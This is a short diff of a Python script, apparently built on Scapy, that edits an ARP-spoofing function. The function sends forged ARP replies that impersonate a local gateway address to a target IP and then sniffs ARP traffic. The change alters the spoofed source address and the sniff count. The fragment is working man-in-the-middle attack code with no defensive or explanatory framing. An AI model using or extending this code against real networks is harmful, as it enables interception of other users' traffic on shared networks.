@@ -17,9 +17,9 @@ def scan(ip):
     return client_list
 
 def spoof(ip):
-    arp = ARP(op=2, psrc="192.168.159.1", pdst=ip, hwsrc=mac)
+    arp = ARP(op=2, psrc="192.168.159.2", pdst=ip, hwsrc=mac)
     pkt = send(arp)
-    x = sniff(filter="arp", count=5, timeout=2)
+    x = sniff(filter="arp", count=10, timeout=2)
     print (x.summary())
     print ("done")
 
